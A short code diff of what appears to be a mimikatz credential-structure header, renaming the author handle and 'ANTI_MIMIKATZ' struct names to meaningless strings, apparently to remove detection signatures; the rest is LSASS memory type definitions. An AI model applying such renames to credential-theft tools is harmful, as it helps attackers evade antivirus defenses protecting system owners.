@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #pragma once
@@ -146,9 +146,9 @@ typedef struct _KIWI_MSV1_0_LIST_61 {
 	PVOID CredentialManager;
 } KIWI_MSV1_0_LIST_61, *PKIWI_MSV1_0_LIST_61;
 
-typedef struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ {
-	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ *Flink;
-	struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ *Blink;
+typedef struct _KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ {
+	struct _KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ *Flink;
+	struct _KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ *Blink;
 	PVOID unk0;
 	ULONG unk1;
 	PVOID unk2;
@@ -181,7 +181,7 @@ typedef struct _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ {
 	PVOID unk21;
 	ULONG unk22;
 	PVOID CredentialManager;
-} KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, *PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ;
+} KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, *PKIWI_MSV1_0_LIST_61_ANTI_EARDOGZ;
 
 typedef struct _KIWI_MSV1_0_LIST_62 {
 	struct _KIWI_MSV1_0_LIST_62 *Flink;
